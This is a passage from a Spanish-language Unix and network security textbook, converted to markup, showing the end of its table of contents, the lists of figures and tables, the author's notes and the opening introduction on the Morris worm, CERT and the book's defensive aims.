  url="#x1-33400022.3"  ></ulink>An&#x00E1;lisis de riesgos</tocentry> 
<tocentry role="subsectionToc">22.3.1&#x00A0;<anchor 
   id="QQ2-1-367"  ></anchor><ulink 
  url="#x1-33500022.3.1"  ></ulink>Identi&#xFB01;caci&#x00F3;n de recursos</tocentry> 
<tocentry role="subsectionToc">22.3.2&#x00A0;<anchor 
   id="QQ2-1-368"  ></anchor><ulink 
  url="#x1-33600022.3.2"  ></ulink>Identi&#xFB01;caci&#x00F3;n de
amenazas</tocentry> 
<tocentry role="subsectionToc">22.3.3&#x00A0;<anchor 
   id="QQ2-1-369"  ></anchor><ulink 
  url="#x1-33700022.3.3"  ></ulink>Medidas de protecci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">22.4&#x00A0;<anchor 
   id="QQ2-1-370"  ></anchor><ulink 
  url="#x1-33800022.4"  ></ulink>Estrategias de respuesta</tocentry> 
<tocentry role="sectionToc">22.5&#x00A0;<anchor 
   id="QQ2-1-371"  ></anchor><ulink 
  url="#x1-33900022.5"  ></ulink>Outsourcing</tocentry> 
<tocentry role="sectionToc">22.6&#x00A0;<anchor 
   id="QQ2-1-372"  ></anchor><ulink 
  url="#x1-34000022.6"  ></ulink>El
&#x2018;&#x00C1;rea de Seguridad&#x2019;</tocentry> 
<tocentry role="partToc">VI&#x00A0;<anchor 
   id="QQ2-1-373"  ></anchor><ulink 
  url="#x1-341000VI"  ></ulink>Ap&#x00E9;ndices</tocentry> 
<tocentry role="appendixToc">A&#x00A0;<anchor 
   id="QQ2-1-374"  ></anchor><ulink 
  url="#x1-342000A"  ></ulink>Seguridad b&#x00E1;sica para administradores</tocentry> 
<tocentry role="sectionToc">A.1&#x00A0;<anchor 
   id="QQ2-1-375"  ></anchor><ulink 
  url="#x1-343000A.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">A.2&#x00A0;<anchor 
   id="QQ2-1-376"  ></anchor><ulink 
  url="#x1-344000A.2"  ></ulink>Detecci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">A.3&#x00A0;<anchor 
   id="QQ2-1-377"  ></anchor><ulink 
  url="#x1-345000A.3"  ></ulink>Recuperaci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">A.4&#x00A0;<anchor 
   id="QQ2-1-378"  ></anchor><ulink 
  url="#x1-346000A.4"  ></ulink>Recomendaciones
de seguridad para los usuarios</tocentry> 
<tocentry role="sectionToc">A.5&#x00A0;<anchor 
   id="QQ2-1-379"  ></anchor><ulink 
  url="#x1-347000A.5"  ></ulink>Referencias r&#x00E1;pidas</tocentry> 
<tocentry role="subsectionToc">A.5.1&#x00A0;<anchor 
   id="QQ2-1-380"  ></anchor><ulink 
  url="#x1-348000A.5.1"  ></ulink>Prevenci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">A.5.2&#x00A0;<anchor 
   id="QQ2-1-381"  ></anchor><ulink 
  url="#x1-349000A.5.2"  ></ulink>Detecci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">A.5.3&#x00A0;<anchor 
   id="QQ2-1-382"  ></anchor><ulink 
  url="#x1-350000A.5.3"  ></ulink>Recuperaci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">A.5.4&#x00A0;<anchor 
   id="QQ2-1-383"  ></anchor><ulink 
  url="#x1-351000A.5.4"  ></ulink>Usuarios</tocentry> 
<tocentry role="appendixToc">B&#x00A0;<anchor 
   id="QQ2-1-384"  ></anchor><ulink 
  url="#x1-352000B"  ></ulink>Normativa</tocentry> 
<tocentry role="sectionToc">B.1&#x00A0;<anchor 
   id="QQ2-1-385"  ></anchor><ulink 
  url="#x1-353000B.1"  ></ulink>Nuevo
C&#x00F3;digo Penal</tocentry> 
<tocentry role="sectionToc">B.2&#x00A0;<anchor 
   id="QQ2-1-386"  ></anchor><ulink 
  url="#x1-354000B.2"  ></ulink>Reglamento de Seguridad de la LORTAD</tocentry> 
<tocentry role="sectionToc">B.3&#x00A0;<anchor 
   id="QQ2-1-387"  ></anchor><ulink 
  url="#x1-355000B.3"  ></ulink>Ley Org&#x00E1;nica de Protecci&#x00F3;n de
Datos</tocentry> 
<tocentry role="appendixToc">C&#x00A0;<anchor 
   id="QQ2-1-388"  ></anchor><ulink 
  url="#x1-356000C"  ></ulink>Recursos de inter&#x00E9;s en INet</tocentry> 
<tocentry role="sectionToc">C.1&#x00A0;<anchor 
   id="QQ2-1-389"  ></anchor><ulink 
  url="#x1-357000C.1"  ></ulink>Publicaciones peri&#x00F3;dicas</tocentry> 
<tocentry role="sectionToc">C.2&#x00A0;<anchor 
   id="QQ2-1-390"  ></anchor><ulink 
  url="#x1-358000C.2"  ></ulink>Organizaciones</tocentry> 
<tocentry role="subsectionToc">C.2.1&#x00A0;<anchor 
   id="QQ2-1-391"  ></anchor><ulink 
  url="#x1-359000C.2.1"  ></ulink>Profesionales</tocentry> 
<tocentry role="subsectionToc">C.2.2&#x00A0;<anchor 
   id="QQ2-1-392"  ></anchor><ulink 
  url="#x1-360000C.2.2"  ></ulink>Gubernamentales/militares</tocentry> 
<tocentry role="appendixToc">D&#x00A0;<anchor 
   id="QQ2-1-393"  ></anchor><ulink 
  url="#x1-361000D"  ></ulink>Glosario
de t&#x00E9;rminos anglosajones</tocentry> 
<tocentry role="appendixToc">D&#x00A0;<anchor 
   id="QQ2-1-394"  ></anchor><ulink 
  url="#x1-362000D"  ></ulink>Conclusiones</tocentry> 
<tocentry role="appendixToc">D&#x00A0;<anchor 
   id="QQ2-1-395"  ></anchor><ulink 
  url="#x1-363000D"  ></ulink>GNU Free Documentation License</tocentry> 
<tocentry role="sectionToc">D.1&#x00A0;<anchor 
   id="QQ2-1-397"  ></anchor><ulink 
  url="#x1-365000D.1"  ></ulink>Applicability
and De&#xFB01;nitions</tocentry> 
<tocentry role="sectionToc">D.2&#x00A0;<anchor 
   id="QQ2-1-398"  ></anchor><ulink 
  url="#x1-366000D.2"  ></ulink>Verbatim Copying</tocentry> 
<tocentry role="sectionToc">D.3&#x00A0;<anchor 
   id="QQ2-1-399"  ></anchor><ulink 
  url="#x1-367000D.3"  ></ulink>Copying in Quantity</tocentry> 
<tocentry role="sectionToc">D.4&#x00A0;<anchor 
   id="QQ2-1-400"  ></anchor><ulink 
  url="#x1-368000D.4"  ></ulink>Modi&#xFB01;cations</tocentry> 
<tocentry role="sectionToc">D.5&#x00A0;<anchor 
   id="QQ2-1-401"  ></anchor><ulink 
  url="#x1-369000D.5"  ></ulink>Combining
Documents</tocentry> 
<tocentry role="sectionToc">D.6&#x00A0;<anchor 
   id="QQ2-1-402"  ></anchor><ulink 
  url="#x1-370000D.6"  ></ulink>Collections of Documents</tocentry> 
<tocentry role="sectionToc">D.7&#x00A0;<anchor 
   id="QQ2-1-403"  ></anchor><ulink 
  url="#x1-371000D.7"  ></ulink>Aggregation With Independent
Works</tocentry> 
<tocentry role="sectionToc">D.8&#x00A0;<anchor 
   id="QQ2-1-404"  ></anchor><ulink 
  url="#x1-372000D.8"  ></ulink>Translation</tocentry> 
<tocentry role="sectionToc">D.9&#x00A0;<anchor 
   id="QQ2-1-405"  ></anchor><ulink 
  url="#x1-373000D.9"  ></ulink>Termination</tocentry> 
<tocentry role="sectionToc">D.10&#x00A0;<anchor 
   id="QQ2-1-406"  ></anchor><ulink 
  url="#x1-374000D.10"  ></ulink>Future Revisions of This License</tocentry>
  </tocpart></toc><para></para>

  </section><!--end likechapter--><!--l. 49--><section 
role="likechapter"><title><anchor 
   id="x1-2000"  ></anchor>&#x00CD;ndice de &#xFB01;guras</title>
  <toc><tocpart> 
<tocentry role="lofToc">1.1&#x00A0;<ulink 
  url="#x1-90021"  ></ulink>Flujo normal de informaci&#x00F3;n entre emisor y receptor y posibles amenazas: (a)
interrupci&#x00F3;n, (b) interceptaci&#x00F3;n, (c) modi&#xFB01;caci&#x00F3;n y (d) fabricaci&#x00F3;n.</tocentry> 
<tocentry role="lofToc">1.2&#x00A0;<ulink 
  url="#x1-140012"  ></ulink>Visi&#x00F3;n global de la
seguridad inform&#x00E1;tica</tocentry> 
<tocentry role="lofToc">3.1&#x00A0;<ulink 
  url="#x1-470011"  ></ulink>El resultado de un basureo involuntario.</tocentry> 
<tocentry role="lofToc">4.1&#x00A0;<ulink 
  url="#x1-550011"  ></ulink>Permisos de un
&#xFB01;chero</tocentry> 
<tocentry role="lofToc">8.1&#x00A0;<ulink 
  url="#x1-1120011"  ></ulink>Estructura gen&#x00E9;rica de una smartcard.</tocentry> 
<tocentry role="lofToc">8.2&#x00A0;<ulink 
  url="#x1-1160012"  ></ulink>Huella dactilar con sus minucias
extra&#x02CA;&#x0131;das. &#x00A9;1998 Idex AS, http://www.idex.no/.</tocentry> 
<tocentry role="lofToc">8.3&#x00A0;<ulink 
  url="#x1-1190013"  ></ulink>Iris humano con la extracci&#x00F3;n
de su iriscode.</tocentry> 
<tocentry role="lofToc">8.4&#x00A0;<ulink 
  url="#x1-1200014"  ></ulink>Geometr&#x02CA;&#x0131;a de una mano con ciertos par&#x00E1;metros extra&#x02CA;&#x0131;dos.</tocentry> 
<tocentry role="lofToc">8.5&#x00A0;<ulink 
  url="#x1-1270025"  ></ulink>La
herramienta de administraci&#x00F3;n admintool (Solaris), con opciones para envejecimiento
de claves.</tocentry> 
<tocentry role="lofToc">11.1&#x00A0;<ulink 
  url="#x1-1610011"  ></ulink>Estructura jer&#x00E1;rquica del SRC.</tocentry> 
<tocentry role="lofToc">11.2&#x00A0;<ulink 
  url="#x1-1720012"  ></ulink>Interfaz de fixdist (AIX).</tocentry> 
<tocentry role="lofToc">15.1&#x00A0;<ulink 
  url="#x1-2290011"  ></ulink>(a)
Aislamiento. (b) Conexi&#x00F3;n total. (c) Firewall entre la zona de riesgo y el per&#x02CA;&#x0131;metro de
seguridad.</tocentry> 
<tocentry role="lofToc">15.2&#x00A0;<ulink 
  url="#x1-2390022"  ></ulink>Arquitectura DMZ.</tocentry> 
<tocentry role="lofToc">16.1&#x00A0;<ulink 
  url="#x1-2430011"  ></ulink>Ubicaci&#x00F3;n del Inspection Module dentro de la
pila de protocolos OSI.</tocentry> 
<tocentry role="lofToc">16.2&#x00A0;<ulink 
  url="#x1-2460012"  ></ulink>Una imagen de fwlv.</tocentry> 
<tocentry role="lofToc">18.1&#x00A0;<ulink 
  url="#x1-2880011"  ></ulink>Puntos cl&#x00E1;sicos de defensa entre
un atacante y un objetivo.</tocentry> 
<tocentry role="lofToc">18.2&#x00A0;<ulink 
  url="#x1-2900012"  ></ulink>Situaci&#x00F3;n del sensor</tocentry> 
<tocentry role="lofToc">19.1&#x00A0;<ulink 
  url="#x1-3010011"  ></ulink>Protocolo de autenticaci&#x00F3;n
Kerberos.</tocentry> 
<tocentry role="lofToc">20.1&#x00A0;<ulink 
  url="#x1-3060011"  ></ulink>Estructura de un criptosistema</tocentry> 
<tocentry role="lofToc">21.1&#x00A0;<ulink 
  url="#x1-3290011"  ></ulink>Interfaz gr&#x00E1;&#xFB01;co de Nessus.</tocentry>
  </tocpart></toc><para></para>

<!--l. 50--><para>

  </para></section><!--end likechapter--><!--l. 50--><section 
role="likechapter"><title><anchor 
   id="x1-3000"  ></anchor>&#x00CD;ndice de cuadros</title>
  <toc><tocpart> 
<tocentry role="lotToc">4.1&#x00A0;<ulink 
  url="#x1-570011"  ></ulink>Atributos de los archivos en ext2fs.</tocentry> 
<tocentry role="lotToc">7.1&#x00A0;<ulink 
  url="#x1-1020011"  ></ulink>Comparaci&#x00F3;n de diferentes medios
de almacenamiento secundario.</tocentry> 
<tocentry role="lotToc">7.2&#x00A0;<ulink 
  url="#x1-1040022"  ></ulink>Opciones de la orden dump</tocentry> 
<tocentry role="lotToc">7.3&#x00A0;<ulink 
  url="#x1-1040033"  ></ulink>Opciones
de la orden restore</tocentry> 
<tocentry role="lotToc">7.4&#x00A0;<ulink 
  url="#x1-1050014"  ></ulink>Opciones de la orden tar</tocentry> 
<tocentry role="lotToc">7.5&#x00A0;<ulink 
  url="#x1-1060015"  ></ulink>Opciones de la orden
cpio.</tocentry> 
<tocentry role="lotToc">8.1&#x00A0;<ulink 
  url="#x1-1130011"  ></ulink>Comparaci&#x00F3;n de m&#x00E9;todos biom&#x00E9;tricos.</tocentry> 
<tocentry role="lotToc">8.2&#x00A0;<ulink 
  url="#x1-1270032"  ></ulink>C&#x00F3;digos de caracteres para el
envejecimiento de contrase~nas.</tocentry> 
<tocentry role="lotToc">12.1&#x00A0;<ulink 
  url="#x1-1780011"  ></ulink>Privilegios de grupo en HP-UX</tocentry> 
<tocentry role="lotToc">18.1&#x00A0;<ulink 
  url="#x1-2890011"  ></ulink>Algunos puertos
a monitorizar en un &#xFB01;rewall</tocentry> 
<tocentry role="lotToc">19.1&#x00A0;<ulink 
  url="#x1-2980011"  ></ulink>Abreviaturas utilizadas.</tocentry> 
<tocentry role="lotToc">20.1&#x00A0;<ulink 
  url="#x1-3130011"  ></ulink>Tableau Vig&#x00E8;nere</tocentry>
  </tocpart></toc><para></para>

<!--l. 51--><para>


</para><!--l. 1--><para>

  </para><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-40000"  ></anchor>Notas del autor</title>
<!--l. 2--><para>  El mundo de la seguridad inform&#x00E1;tica es demasiado amplio y complejo como para ser tratado
exhaustivamente en ning&#x00FA;n trabajo, mucho menos en uno tan simple como este; aqu&#x02CA;&#x0131; &#x00FA;nicamente he
intentado resumir una visi&#x00F3;n global de diferentes aspectos relacionados con la seguridad, especialmente con
Unix y redes de computadores (estas &#x00FA;ltimas tan de moda hoy en d&#x02CA;&#x0131;a&#x2026;Unix por desgracia no
tanto). Este trabajo est&#x00E1; casi completamente extra&#x02CA;&#x0131;do de mi proyecto &#xFB01;nal de carrera, que
estudiaba la seguridad en los sistemas Unix y la red de la Universidad Polit&#x00E9;cnica de Valencia
(UPV), de forma que si aparece alguna referencia a &#x2018;nuestra red&#x2019; o &#x2018;nuestros equipos&#x2019; &#x2013; aunque
he intentado eliminar todos los ejemplos y comentarios relativos a UPV, por motivos obvios
&#x2013; ya sabemos de qu&#x00E9; se trata. A pesar de haberlo revisado bastantes veces (lo bueno de no
tener vida social es que uno tiene mucho tiempo para leer ;-), evidentemente existir&#x00E1;n errores y
faltar&#x00E1;n datos que podr&#x02CA;&#x0131;an haber aparecido, por lo que agradecer&#x00E9; cualquier sugerencia o cr&#x02CA;&#x0131;tica
(constructiva, las destructivas directamente a /dev/null) que se me quiera hacer. Para ponerse en
contacto conmigo se puede utilizar la direcci&#x00F3;n de correo electr&#x00F3;nico que utilizo habitualmente:
toni@aiind.upv.es.
<!--br/-->
<!--br/-->Durante la realizaci&#x00F3;n de este proyecto ni se han maltratado animales ni se han utilizado productos
Microsoft; personalmente, siempre he considerado rid&#x02CA;&#x0131;culo hablar de seguridad en Unix &#x2013; incluso de
seguridad en general &#x2013; y hacerlo utilizando productos de una compa~n&#x02CA;&#x0131;a que tantas veces ha demostrado su
desinter&#x00E9;s por la tecnolog&#x02CA;&#x0131;a frente a su inter&#x00E9;s por el marketing. El trabajo entero ha sido creado sobre
diversos clones de Unix (principalmente Solaris y Linux, y en menor medida HP-UX, BSD/OS,
IRIX, AIX e incluso Minix). El texto ha sido escrito &#x02CA;&#x0131;ntegramente con vi (vi es EL editor, el
resto de editores no son vi ;-) y compuesto con LaTeX, de Leslie Lamport; realmente, algunos
fragmentos han sido extra&#x02CA;&#x0131;dos de documentos que hice hace tiempo con troff (s&#x02CA;&#x0131;, troff), de Joe
Ossanna y Brian Kernighan, transformados a LaTeX&#x00A0;mediante tr2tex, de Kamal Al&#x2013;Yahya, y
retocados con algo de paciencia. Para las &#xFB01;guras simples he utilizado el lenguaje PIC, tambi&#x00E9;n de
Brian Kernighan, y para las que son m&#x00E1;s complejas xfig. La captura de alguna pantalla se ha
hecho con xwd y GIMP, y el retoque y transformaci&#x00F3;n de im&#x00E1;genes con este &#x00FA;ltimo junto a xv y
xpaint.
<!--br/-->
<!--br/-->Quiero agradecer desde aqu&#x02CA;&#x0131; la colaboraci&#x00F3;n desinteresada de algunas personas que han hecho posible este
trabajo (m&#x00E1;s concretamente, que hicieron posible mi proyecto &#xFB01;nal de carrera): Pedro L&#x00F3;pez
(Departamento de Inform&#x00E1;tica de Sistemas y Computadores, UPV), Jon Ander G&#x00F3;mez (Departamento de
Sistemas Inform&#x00E1;ticos y Computaci&#x00F3;n, UPV), Vicent Benet (Centro de C&#x00E1;lculo, UPV), Jos&#x00E9; Manuel
Pasamar (Centro de C&#x00E1;lculo, UPV) y Albert Ortiz (Universitat Polit&#x00E8;cnica de Catalunya). Y por
supuesto a mi director, Ismael Ripoll (Departamento de Inform&#x00E1;tica de Sistemas y Computadores,
UPV).
<!--br/-->
<!--br/-->Tras publicar la versi&#x00F3;n 1.0 de este trabajo, algunos de los primeros comentarios que se me
han hecho trataban sobre los posibles problemas legales derivados de la falta de una licencia
para el documento; desconozco hasta qu&#x00E9; punto esos problemas son reales, pero de cualquier
forma para tratar de evitarlos he decidido adoptar la Open Publication License como formato
de licencia bajo la que distribuir mi trabajo, al menos de forma temporal. Eso b&#x00E1;sicamente
implica (en castellano plano) que puedes imprimir el documento, leerlo, fotocopiarlo, regalarlo o
similares, pero no venderlo; este trabajo es gratuito y pretendo que lo siga siendo. Si alguien lo
encuentra &#x00FA;til, que me apoye moralmente con un e-mail :), y si alguien lo encuentra muy &#x00FA;til (lo
dudo) que destine el dinero que crea que pagar&#x02CA;&#x0131;a por esto a cosas m&#x00E1;s &#x00FA;tiles. &#x00BF;Sab&#x02CA;&#x0131;as que cada
minuto mueren de hambre aproximadamente doce ni~nos en el tercer mundo? En el tiempo
que te puede costar leer estas notas con un m&#x02CA;&#x0131;nimo de inter&#x00E9;s habr&#x00E1;n muerto unos veinticinco;
mientras que nosotros nos preocupamos intentando proteger nuestros sistemas, hay millones de
personas que no pueden perder el tiempo en esas cosas: est&#x00E1;n demasiado ocupadas intentando
sobrevivir.
<!--br/-->
<!--br/-->Ah, por &#x00FA;ltimo, ser&#x02CA;&#x0131;a imperdonable no dar las gracias a la gente que ha le&#x02CA;&#x0131;do este trabajo y me ha
informado de erratas que hab&#x02CA;&#x0131;a en &#x00E9;l; he intentado corregir todos los fallos encontrados, pero a&#x00FA;n habr&#x00E1;
errores, por lo que repito lo que dec&#x02CA;&#x0131;a al principio: todos los comentarios constructivos son siempre
bienvenidos. Debo agradecer especialmente a David Cerezo el inter&#x00E9;s que demostr&#x00F3; en las versiones iniciales

de este documento, as&#x02CA;&#x0131; como todas las observaciones que sobre las mismas me hizo llegar.
<!--br/-->NOTAS A LA VERSI&#x00D3;N 2.0
<!--br/-->No hay mucho que a~nadir a lo dicho hace casi dos a~nos; y es que las cosas apenas han cambiado: el
panorama en Espa~na &#x2013; en cuanto a seguridad se re&#xFB01;ere &#x2013; sigue siendo desolador, las empresas tecnol&#x00F3;gicas
caen d&#x02CA;&#x0131;a a d&#x02CA;&#x0131;a, la investigaci&#x00F3;n en materias de seguridad (si exceptuamos la Criptograf&#x02CA;&#x0131;a) es nula, y poco
m&#x00E1;s. S&#x00F3;lo dar las gracias una vez m&#x00E1;s a todos los que han publicado o se han hecho eco de este documento
(Kript&#x00F3;polis, HispaLinux, IrisCERT, Hispasec, Asociaci&#x00F3;n de Internautas&#x2026;) y tambi&#x00E9;n a toda la gente que lo
ha leido (al menos en parte ;-) y ha perdido unos minutos escribi&#x00E9;ndome un e&#x2013;mail con alg&#x00FA;n comentario;
realmente es algo que se agradece, y aunque tarde en responder al correo, siempre trato de
contestar.
<!--br/-->
<!--br/-->Como algunos de los comentarios acerca del documento que me han llegado hablaban del &#x2018;excesivo&#x2019;
tama~no del mismo, en esta nueva versi&#x00F3;n he cambiado la forma de generar el &#xFB01;chero PDF;
he convertido todas las im&#x00E1;genes a formato PNG y despu&#x00E9;s utilizado pdflatex para compilar
los &#xFB01;cheros, habiendo modi&#xFB01;cado previamente el c&#x00F3;digo mediante un sencillo script. Aunque
a&#x00FA;n ocupa bastante, hay que tener en cuenta que estamos hablando de unas 500 p&#x00E1;ginas de
documento&#x2026;
<!--br/-->TODO
<!--br/-->Igual que hace casi dos a~nos, sigue en pie la intenci&#x00F3;n de crear cap&#x02CA;&#x0131;tulos nuevos (las redes privadas virtuales
es mi principal tema pendiente) y de comentar la seguridad de mecanismos como DNS, RPC, NIS o
NFS&#x2026;espero disponer de algo m&#x00E1;s de tiempo para poder hacerlo. Quiero tambi&#x00E9;n escribir m&#x00E1;s acerca de
la detecci&#x00F3;n de intrusos, no s&#x00E9; si en este documento o en uno aparte, ya que es quiz&#x00E1;s el tema
que m&#x00E1;s me interesa y en lo que m&#x00E1;s trabajo actualmente. Y &#xFB01;nalmente, en mi lista de cosas
para hacer, pone dormir (s&#x02CA;&#x0131;, lo pone en negrita) como algo que tambi&#x00E9;n queda pendiente :)
<!--br/-->HISTORY
<!--br/-->Versi&#x00F3;n 1.0 (Julio&#x02CA;


</para><!--l. 1--><para>

  </para></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-50001"  ></anchor>Introducci&#x00F3;n y conceptos previos</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">1.1</abbrev><anchor 
   id="x1-60001.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Hasta &#xFB01;nales de 1988 muy poca gente tomaba en serio el tema de la seguridad en redes de computadores
de prop&#x00F3;sito general. Mientras que por una parte Internet iba creciendo exponencialmente con redes
importantes que se adher&#x02CA;&#x0131;an a ella, como BITNET o HEPNET, por otra el auge de la inform&#x00E1;tica de consumo
(hasta la d&#x00E9;cada de los ochenta muy poca gente se pod&#x02CA;&#x0131;a permitir un ordenador y un m&#x00F3;dem en casa) unido
a factores menos t&#x00E9;cnicos (como la pel&#x02CA;&#x0131;cula Juegos de Guerra, de 1983) iba produciendo un aumento
espectacular en el n&#x00FA;mero de piratas inform&#x00E1;ticos.
<!--br/-->
<!--br/-->Sin embargo, el 22 de noviembre de 1988 Robert T. Morris protagoniz&#x00F3; el primer gran incidente
de la seguridad inform&#x00E1;tica: uno de sus programas se convirti&#x00F3; en el famoso worm o gusano
de Internet. Miles de ordenadores conectados a la red se vieron inutilizados durante d&#x02CA;&#x0131;as, y
las p&#x00E9;rdidas se estiman en millones de d&#x00F3;lares. Desde ese momento el tema de la seguridad en
sistemas operativos y redes ha sido un factor a tener muy en cuenta por cualquier responsable o
administrador de sistemas inform&#x00E1;ticos. Poco despu&#x00E9;s de este incidente, y a la vista de los potenciales
peligros que pod&#x02CA;&#x0131;a entra~nar un fallo o un ataque a los sistemas inform&#x00E1;ticos estadounidenses
(en general, a los sistemas de cualquier pa&#x02CA;&#x0131;s) la agencia DARPA (Defense Advanced Research
Projects Agency) cre&#x00F3; el CERT (Computer Emergency Response Team), un grupo formado en su
mayor parte por voluntarios cuali&#xFB01;cados de la comunidad inform&#x00E1;tica, cuyo objetivo principal es
facilitar una respuesta r&#x00E1;pida a los problemas de seguridad que afecten a hosts de Internet
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Han pasado m&#x00E1;s de diez a~nos desde la creaci&#x00F3;n del primer CERT, y cada d&#x02CA;&#x0131;a se hace patente la preocupaci&#x00F3;n
por los temas relativos a la seguridad en la red y sus equipos, y tambi&#x00E9;n se hace patente la necesidad de
esta seguridad. Los piratas de anta~no casi han desaparecido, dando paso a nuevas generaciones de intrusos
que forman grupos como Chaos Computer Club o Legion of Doom, organizan encuentros como el espa~nol
Iberhack, y editan revistas o zines electr&#x00F3;nicos (2600: The Hacker&#x2019;s Quartely o Phrack son
quiz&#x00E1;s las m&#x00E1;s conocidas, pero no las &#x00FA;nicas). Todo esto con un objetivo principal: compartir
conocimientos. Si hace unos a~nos cualquiera que quisiera adentrarse en el mundo underground casi no
ten&#x02CA;&#x0131;a m&#x00E1;s remedio que conectar a alguna BBS donde se tratara el tema, generalmente con una
cantidad de informaci&#x00F3;n muy limitada, hoy en d&#x02CA;&#x0131;a tiene a su disposici&#x00F3;n gigabytes de informaci&#x00F3;n
electr&#x00F3;nica publicada en Internet; cualquier aprendiz de pirata puede conectarse a un servidor web,
descargar un par de programas y ejecutarlos contra un servidor desprotegido... con un poco de
(mala) suerte, esa misma persona puede conseguir un control total sobre un servidor Unix de
varios millones de pesetas, probablemente desde su PC con Windows 98 y sin saber nada
sobre Unix. De la misma forma que en su d&#x02CA;&#x0131;a Juegos de Guerra cre&#x00F3; una nueva generaci&#x00F3;n de
piratas, en la segunda mitad de los noventa pel&#x02CA;&#x0131;culas como The Net, Hackers o Los Corsarios
del Chip han creado otra generaci&#x00F3;n, en general mucho menos peligrosa que la anterior, pero
cuanto menos, preocupante: aunque sin grandes conocimientos t&#x00E9;cnicos, tienen a su disposici&#x00F3;n
multitud de programas y documentos sobre seguridad (algo que los piratas de los ochenta
apenas pod&#x02CA;&#x0131;an imaginar), adem&#x00E1;s de ordenadores potentes y conexiones a Internet baratas. Por
si esto fuera poco, se ven envalentonados a trav&#x00E9;s de sistemas de conversaci&#x00F3;n como el IRC
(Internet Relay Chat), donde en canales como #hack o #hackers presumen de sus logros ante sus
colegas.
  </para></section><!--end section--><!--l. 56--><section 
role="section"><title><abbrev role="title-mark">1.2</abbrev><anchor 
   id="x1-70001.2"  ></anchor>Justi&#xFB01;caci&#x00F3;n y objetivos</title>
<!--l. 57--><para>  A la vista de lo comentado en el primer punto, parece claro que la seguridad de los equipos Unix ha de
ser algo a considerar en cualquier red. Diariamente por cualquiera de ellas circulan todo tipo de datos,
entre ellos muchos que se podr&#x02CA;&#x0131;an catalogar como con&#xFB01;denciales (n&#x00F3;minas, expedientes, presupuestos&#x2026;) o al
menos como privados (correo electr&#x00F3;nico, proyectos de investigaci&#x00F3;n, art&#x02CA;&#x0131;culos a punto de ser publicados&#x2026;).
Independientemente de la etiqueta que cada usuario de la red quiera colgarle a sus datos, parece
claro que un fallo de seguridad de un equipo Unix o de la propia red no bene&#xFB01;cia a nadie,
y mucho menos a la imagen de nuestra organizaci&#x00F3;n. Y ya no se trata simplemente de una
cuesti&#x00F3;n de imagen: seg&#x00FA;n el Computer Security Institute, en su encuesta de 1998, las p&#x00E9;rdidas

econ&#x00F3;micas ocasionadas por delitos relacionados con nuevas tecnolog&#x02CA;&#x0131;as (principalmente accesos
internos no autorizados) s&#x00F3;lo en Estados Unidos ascienden anualmente a m&#x00E1;s 20.000 millones de
pesetas, cifra que cada a~no se incrementa en m&#x00E1;s del 35 %; los delitos inform&#x00E1;ticos en general
aumentan tambi&#x00E9;n de forma espectacular a~no tras a~no, alcanzando incluso cotas del 800 %
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->A lo largo de este trabajo se va a intentar hacer un repaso de los puntos habituales referentes a seguridad
en Unix y redes de computadores (problemas, ataques, defensas&#x2026;), aplicando el estudio a entornos con
requisitos de seguridad medios (universidades, empresas, proveedores de acceso a Internet&#x2026;); de esta forma
se ofrecer&#x00E1; una perspectiva general de la seguridad en entornos Unix, el funcionamiento de sus mecanismos,
y su correcta utilizaci&#x00F3;n. Tambi&#x00E9;n se hablar&#x00E1;, en menor medida, sobre temas menos t&#x00E9;cnicos pero que tambi&#x00E9;n
afectan directamente a la seguridad inform&#x00E1;tica, como puedan ser el problema del personal o la legislaci&#x00F3;n
vigente.
<!--br/-->
<!--br/-->El objetivo &#xFB01;nal de este proyecto ser&#x02CA;&#x0131;a marcar unas pautas para conseguir un nivel de seguridad
aceptable en los sistemas Unix conectados en cualquier red, entendiendo por &#x2018;aceptable&#x2019; un nivel de
protecci&#x00F3;n su&#xFB01;ciente para que la mayor&#x02CA;&#x0131;a de potenciales intrusos interesados en los equipos de nuestra
organizaci&#x00F3;n fracasara ante un ataque contra los mismos. Obviamente, es imposible garantizar una
plena seguridad ante cualquier atacante: seguramente un pirata experimentado, con el tiempo
su&#xFB01;ciente, pagado, o simplemente muy interesado en uno de nuestros equipos, no tendr&#x02CA;&#x0131;a muchos
problemas en acceder a &#x00E9;l. Este hecho, aunque preocupante, es casi inevitable; lo evitable es
que cualquier persona sea capaz de atacar con &#x00E9;xito un equipo simplemente por haber visto
una pel&#x02CA;&#x0131;cula, descargado un par de p&#x00E1;ginas web y ejecutado un programa que ni ha hecho ni
entiende.
<!--br/-->
<!--br/-->Por supuesto, este proyecto no pretende ser en ning&#x00FA;n momento una ayuda para la gente que est&#x00E9; interesada
en atacar m&#x00E1;quinas Unix o subredes completas, ni tampoco una invitaci&#x00F3;n a hacerlo. Aunque por su
naturaleza la informaci&#x00F3;n aqu&#x02CA;&#x0131; presentada puede ser utilizada para da~nar sistemas inform&#x00E1;ticos (como
cualquier informaci&#x00F3;n sobre seguridad inform&#x00E1;tica), no es ese su prop&#x00F3;sito sino, como hemos dicho,
incrementar la seguridad de los sistemas Unix y las redes en las que &#x00E9;stos se ubican. Por tanto va a intentar
estar escrito de forma que no se pueda utilizar f&#x00E1;cilmente como una &#x2018;receta de cocina&#x2019; para
crackers; si alguien quiere un documento sobre c&#x00F3;mo atacar sistemas, puede dejar de leer este
trabajo y buscar en Internet informaci&#x00F3;n sobre ese tema. Conseguir romper la seguridad de un
sistema de forma no autorizada es, en la mayor&#x02CA;&#x0131;a de los casos, un s&#x02CA;&#x0131;mbolo de inmadurez, y por
supuesto ni denota inteligencia ni unos excesivos conocimientos: si alguien se considera superior
por acceder ilegalmente a una m&#x00E1;quina utilizando un programa que ni ha hecho ni es capaz
de entender, que revise sus principios, y si tras hacerlo a&#x00FA;n piensa lo mismo, que dedique su
inteligencia y sus conocimientos a tareas que ayuden a incrementar la seguridad, como la
